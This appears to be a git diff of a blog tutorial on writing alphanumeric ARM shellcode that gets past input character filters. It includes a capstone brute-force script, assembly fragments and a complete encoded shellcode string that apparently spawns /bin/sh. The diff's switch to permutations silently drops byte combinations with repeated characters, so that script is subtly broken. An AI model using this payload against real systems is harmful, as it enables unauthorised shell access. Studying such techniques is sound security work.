@@ -3,14 +3,14 @@ title: Arm Alphanumeric Shellcode
 updated: 2018-03-15 19:11:19
 ---
 
-- [Alphanumeric ARM Shellcode](#org5b5fd8f)
+- [Alphanumeric ARM Shellcode](#org3909a5f)
 
 
-<a id="org5b5fd8f"></a>
+<a id="org3909a5f"></a>
 
 # Alphanumeric ARM Shellcode
 
-Shellcode is a piece of code that is used as payload in binary exploitation . It is called a shellcode because for most of the time it is used create shell session to the attacker . The process of creating shellcode is that we write the required code in assembly language and this is coveted to hex values by assembling these instructions . And with a security vulnerability we can make the software execute this code thus giving us access to the machine . Some times these shellcode should pass thought many filters due to the method how the data is read or there might be restriction on the possible characters that can be given as input to the program , for example if the program reads the input as command line argument the shellcode should not contain null characters because the string is terminated by a null and the program will only get the values till that position .
+Shellcode is a piece of code that is used as payload in binary exploitation . It is called a shellcode because for most of the time it is used create shell session to the attacker . The process of creating shellcode is that we write the required code in assembly language and this is coveted to binary by assembling these instructions and this is used . And with a security vulnerability we can make the software execute this code thus giving us access to the machine . Some times these shellcode should pass thought many filters due to the method how the data is read or there might be restriction on the possible characters that can be given as input to the program , for example if the program reads the input as command line argument the shellcode should not contain null characters because the string is terminated by a null and the program will only get the values till that position .
 
 An alphanumeric shellcode should only have alphanumeric characters in it . Most of the input filed will accept this input thus this shellcode have a higher success rate that it will be accepted by the program . We will be creating a shellcode for ARM Architecture
 
@@ -19,7 +19,9 @@ So lets begin ,
 We can use capstone to brute all the possible instructions that can be used in both arm and thumb mode . This was useful a couple of time
 
 ```python
+
 from capstone import *
+from itertools import permutations
 
 VALID = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
 
@@ -30,12 +32,9 @@ if THUMB:
 else:
     md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
 
-for n in VALID:
-    for m in VALID:
-        for o in VALID:
-            for p in VALID:
-                for i in md.disasm(n+m+o+p, 0x1000):
-                    print("%s:\t%s\t%s" %(n+m+o+p, i.mnemonic, i.op_str))
+for j in permutations(VALID,4):
+    for i in md.disasm(''.join(j), 0x1000):
+        print("%s:\t%s\t%s" %(''.join(j), i.mnemonic, i.op_str))
 ```
 
 The `phrack` [Issue 66 Article 12](http://phrack.org/issues/66/12.html) `Alphanumeric RISC ARM Shellcode` by Yves Younan and Pieter Philippaerts was really help full . There is also [updated](http://amnesia.gtisc.gatech.edu/~moyix/CCS_09/docs/p11.pdf) version of this paper by the same person
@@ -151,7 +150,7 @@ This is the finished shellcode , It is not that optimized but does the job .
 	muls r5, r2      # the following code are for inserting
 	adds r1, 0x43    # swi and bx instructions
 	subs r1, 0x41    # 2 0 159 239     ->      swi 0x9f0002
-	adds r5, 0x4d    # 22 255 47 225   ->      bx r6
+    adds r5, 0x4d    # 22 255 47 225   ->      bx r6
 	adds r5, 0x41  
 	strb r1 ,[ r0 , r5 ]
 
@@ -226,7 +225,7 @@ This is the finished shellcode , It is not that optimized but does the job .
 	adds r6 , 0x4a
 
 	muls r0,r2           # r0=0
-	muls r1,r2          
+	muls r1,r2        
 	adds r1 , 0x41       
 	subs r1 , 0x42       # r1=-1
 
@@ -274,4 +273,3 @@ Final shellcode
 > "\x41\x43\x42\x43\x78\x46\x55\x43\x43\x31\x41\x39\x4d\x35\x41\x35\x41\x55\x55\x43\x51\x43\x4d\x35\x42\x35\x41\x55\x55\x43\x51\x43\x61\x31\x70\x31\x32\x39\x4d\x35\x43\x35\x41\x55\x55\x43\x50\x31\x4d\x35\x44\x35\x41\x55\x55\x43\x51\x43\x61\x31\x4b\x39\x4d\x35\x45\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x41\x31\x44\x31\x4d\x35\x46\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x4b\x39\x4d\x35\x47\x35\x41\x55\x55\x43\x70\x31\x42\x31\x4d\x35\x48\x35\x41\x55\x55\x43\x41\x31\x43\x39\x39\x35\x41\x35\x4d\x35\x41\x55\x51\x43\x41\x31\x42\x39\x4e\x42\x46\x43\x4d\x36\x4a\x36\x50\x43\x51\x43\x41\x31\x42\x39\x78\x47\x41\x37\x41\x41\x41\x41\x41\x41\x41\x41\x42\x43\x78\x46\x55\x43\x51\x43\x64\x31\x35\x39\x30\x35\x41\x55\x55\x43\x34\x35\x41\x55\x55\x43\x37\x35\x42\x55\x51\x43\x50\x31\x51\x39\x4f\x42\x51\x43\x4c\x31\x41\x39\x4f\x43\x30\x30\x51\x43\x41\x41\x41\x41\x41\x41\x41\x62\x69\x6e\x41\x73\x68\x41"
 
 Happy Hacking !!
-
